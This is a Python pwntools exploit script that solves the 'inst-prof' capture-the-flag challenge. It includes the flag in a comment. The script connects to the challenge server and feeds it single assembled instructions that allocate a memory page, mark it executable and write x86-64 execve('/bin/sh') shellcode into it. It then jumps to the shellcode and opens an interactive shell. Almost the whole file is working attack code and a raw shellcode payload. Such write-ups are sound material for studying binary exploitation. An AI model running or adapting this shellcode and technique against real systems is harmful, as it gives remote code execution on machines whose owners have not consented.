#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#CTF{0v3r_4ND_0v3r_4ND_0v3r_4ND_0v3r}

#host = "10.211.55.6"
#port = 8888

host = "inst-prof.ctfcompetition.com"
port = 1337

r = remote(host,port)

r.recvuntil("ready")
context.arch = "amd64"

def allocapage():
    log.info("Allocate page")
    r.send(asm("pop r15;push r15"))
    #set r15 to allocapage func
    for i in range(0x128):
        r.send(asm("dec r15;ret"))
    r.send(asm("jmp r15;nop"))

def setpage():
    log.info("set page")
    #set page to r14
    r.send(asm("mov r14,rbx;ret"))
    r.send(asm("dec r14;nop"))

def make_page_exec():
    log.info("make page exec")
    r.send(asm("pop r15;push r15"))
    for i in range(0x18):
        r.send(asm("dec r15;ret"))

def writedata(data):
    log.info("write shellcode")
    r.send(asm("push r14;pop r13"))
    for c in data :
        r.send(asm("mov byte ptr [r14],%s" % hex(ord(c))))
        r.send(asm("inc r14;ret"))
    r.send(asm("push r13;pop r14"))

def save_buf_to_stack():
    r.send(asm("mov r13,rsp;ret"))
    for i in range(8):
        r.send(asm("inc r13;ret"))
    r.send(asm("mov qword ptr [r13],r14"))  

def save_make_exec_on_stack():  
    for i in range(16):
        r.send(asm("inc r13;ret"))
    r.send(asm("mov qword ptr [r13],r15"))


def jmp_to_sc():
    log.info("GET shell")
    r.send(asm("pop rax;pop rbx;pop rax;ret"))


allocapage()
setpage()
make_page_exec()
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
writedata(shellcode)

log.info("Prepare stack")
save_buf_to_stack()
save_make_exec_on_stack()
jmp_to_sc()

r.interactive()
